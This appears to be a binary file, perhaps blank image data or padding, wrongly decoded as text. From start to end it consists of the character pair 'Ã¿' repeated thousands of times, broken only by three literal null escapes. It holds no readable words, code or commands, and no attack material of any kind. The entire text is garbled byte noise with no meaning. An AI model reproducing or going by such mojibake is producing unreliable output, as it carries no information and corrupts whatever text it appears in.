¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿